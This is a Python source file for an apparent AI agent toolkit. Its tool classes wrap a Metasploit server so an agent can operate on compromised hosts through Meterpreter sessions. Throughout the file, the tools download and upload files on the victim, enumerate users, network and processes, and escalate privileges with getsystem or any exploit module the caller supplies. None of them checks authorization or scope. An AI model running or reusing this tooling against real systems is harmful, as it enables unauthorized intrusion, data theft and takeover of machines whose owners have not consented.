"""
Post-Exploitation Tools - Wrappers for Metasploit post-exploitation MCP server tools

These tools provide file operations, system enumeration, and privilege escalation
capabilities on compromised hosts via active Meterpreter sessions.
"""

from typing import Any, Dict, List, Optional
from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.mcp.base_server import MCPClient
import logging

logger = logging.getLogger(__name__)


class FileOperationsTool(BaseTool):
    """Perform file operations on compromised systems via Meterpreter session"""

    def __init__(self, server_url: str = "http://kali-tools:8003"):
        """
        Initialize FileOperations tool.

        Args:
            server_url: URL of Metasploit MCP server
        """
        self.client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="file_operations",
            description="Perform file operations on compromised systems - download, upload, or list files via Meterpreter session.",
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "description": "File operation to perform",
                        "enum": ["download", "upload", "list"]
                    },
                    "session_id": {
                        "type": "integer",
                        "description": "Meterpreter session ID"
                    },
                    "remote_path": {
                        "type": "string",
                        "description": "Remote file or directory path on the compromised system"
                    },
                    "local_path": {
                        "type": "string",
                        "description": "Local file path (required for download/upload)"
                    }
                },
                "required": ["action", "session_id", "remote_path"]
            }
        )

    async def execute(
        self,
        action: str,
        session_id: int,
        remote_path: str,
        local_path: Optional[str] = None,
        **kwargs
    ) -> str:
        """Execute file operation via Meterpreter session"""
        try:
            if action == "download":
                command = f"download \"{remote_path}\""
                if local_path:
                    command += f" \"{local_path}\""
            elif action == "upload":
                if not local_path:
                    return "Error: local_path is required for 'upload' action."
                command = f"upload \"{local_path}\" \"{remote_path}\""
            elif action == "list":
                command = f"ls \"{remote_path}\""
            else:
                return f"Error: Unknown action '{action}'. Supported actions: download, upload, list"

            result = await self.client.call_tool(
                "session_command",
                {"session_id": session_id, "command": command}
            )

            if not result.get("success"):
                return f"Error: {result.get('error', 'Unknown error')}"

            cmd_output = result.get("output", "")

            output = f"File operation '{action}' on session {session_id}:\n"
            output += f"  Remote path: {remote_path}\n"
            if local_path:
                output += f"  Local path: {local_path}\n"
            output += f"  Output:\n{cmd_output}\n"

            return output

        except Exception as e:
            logger.error(f"FileOperations tool error: {e}", exc_info=True)
            return f"Error: {str(e)}"


class SystemEnumerationTool(BaseTool):
    """Enumerate system information on compromised host via active session"""

    ENUM_COMMANDS: Dict[str, List[str]] = {
        "sysinfo": ["sysinfo"],
        "users": ["getuid", "whoami"],
        "network": ["ipconfig"],
        "processes": ["ps"],
    }

    def __init__(self, server_url: str = "http://kali-tools:8003"):
        """
        Initialize SystemEnumeration tool.

        Args:
            server_url: URL of Metasploit MCP server
        """
        self.client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="system_enumerate",
            description="Enumerate system information on compromised host via active session - OS info, users, network, processes.",
            parameters={
                "type": "object",
                "properties": {
                    "session_id": {
                        "type": "integer",
                        "description": "Active session ID"
                    },
                    "enum_type": {
                        "type": "string",
                        "description": "Type of enumeration to perform",
                        "enum": ["sysinfo", "users", "network", "processes", "all"]
                    }
                },
                "required": ["session_id", "enum_type"]
            }
        )

    async def execute(
        self,
        session_id: int,
        enum_type: str,
        **kwargs
    ) -> str:
        """Execute system enumeration via active session"""
        try:
            if enum_type == "all":
                commands_map = self.ENUM_COMMANDS
            elif enum_type in self.ENUM_COMMANDS:
                commands_map = {enum_type: self.ENUM_COMMANDS[enum_type]}
            else:
                supported = ", ".join(list(self.ENUM_COMMANDS.keys()) + ["all"])
                return f"Error: Unknown enum_type '{enum_type}'. Supported types: {supported}"

            output = f"System enumeration ({enum_type}) on session {session_id}:\n"

            for category, commands in commands_map.items():
                output += f"\n=== {category.upper()} ===\n"
                for command in commands:
                    result = await self.client.call_tool(
                        "session_command",
                        {"session_id": session_id, "command": command}
                    )

                    if not result.get("success"):
                        output += f"  [{command}] Error: {result.get('error', 'Unknown error')}\n"
                    else:
                        cmd_output = result.get("output", "")
                        output += f"  [{command}]\n{cmd_output}\n"

            return output

        except Exception as e:
            logger.error(f"SystemEnumeration tool error: {e}", exc_info=True)
            return f"Error: {str(e)}"


class PrivilegeEscalationTool(BaseTool):
    """Attempt privilege escalation on compromised host using various techniques"""

    def __init__(self, server_url: str = "http://kali-tools:8003"):
        """
        Initialize PrivilegeEscalation tool.

        Args:
            server_url: URL of Metasploit MCP server
        """
        self.client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="privilege_escalation",
            description="Attempt privilege escalation on compromised host using various techniques.",
            parameters={
                "type": "object",
                "properties": {
                    "session_id": {
                        "type": "integer",
                        "description": "Active session ID"
                    },
                    "technique": {
                        "type": "string",
                        "description": "Privilege escalation technique to use",
                        "enum": ["getsystem", "suggest", "exploit"]
                    },
                    "module_path": {
                        "type": "string",
                        "description": "Metasploit module path (required when technique is 'exploit')"
                    }
                },
                "required": ["session_id", "technique"]
            }
        )

    async def execute(
        self,
        session_id: int,
        technique: str,
        module_path: Optional[str] = None,
        **kwargs
    ) -> str:
        """Attempt privilege escalation via active session"""
        try:
            if technique == "getsystem":
                result = await self.client.call_tool(
                    "session_command",
                    {"session_id": session_id, "command": "getsystem"}
                )

                if not result.get("success"):
                    return f"Error: {result.get('error', 'Unknown error')}"

                cmd_output = result.get("output", "")

                output = f"Privilege escalation (getsystem) on session {session_id}:\n"
                output += f"  Output:\n{cmd_output}\n"

                return output

            elif technique == "suggest":
                result = await self.client.call_tool(
                    "execute_module",
                    {
                        "module_path": "post/multi/recon/local_exploit_suggester",
                        "rhosts": "",
                        "session": session_id,
                    }
                )

                if not result.get("success"):
                    return f"Error: {result.get('error', 'Unknown error')}"

                raw_output = result.get("output", "")

                output = f"Local exploit suggestions for session {session_id}:\n"
                output += f"{raw_output}\n"

                return output

            elif technique == "exploit":
                if not module_path:
                    return "Error: module_path is required when technique is 'exploit'."

                result = await self.client.call_tool(
                    "execute_module",
                    {
                        "module_path": module_path,
                        "rhosts": "",
                        "session": session_id,
                    }
                )

                if not result.get("success"):
                    return f"Error: {result.get('error', 'Unknown error')}"

                session_opened = result.get("session_opened", False)
                raw_output = result.get("output", "")

                output = f"Privilege escalation exploit on session {session_id}:\n"
                output += f"  Module: {module_path}\n"
                output += f"  New session opened: {session_opened}\n"
                output += f"  Output:\n{raw_output}\n"

                return output

            else:
                return f"Error: Unknown technique '{technique}'. Supported techniques: getsystem, suggest, exploit"

        except Exception as e:
            logger.error(f"PrivilegeEscalation tool error: {e}", exc_info=True)
            return f"Error: {str(e)}"
